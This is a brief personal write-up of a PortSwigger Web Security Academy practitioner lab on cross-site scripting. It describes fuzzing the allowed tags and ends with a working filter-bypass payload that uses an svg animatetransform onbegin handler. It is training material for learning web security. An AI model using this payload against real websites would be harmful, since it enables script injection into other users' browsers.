#portswigger #solution #xss

- **Category:** [[Cross-site scriping (XSS)]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/cross-site-scripting/
- **Date Solved:** 2026-08-19


Step 1: Use intruder attack and find which tag works.
Step 2: Use XSS cheat sheet to try payloads of working tags and get the final payload:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
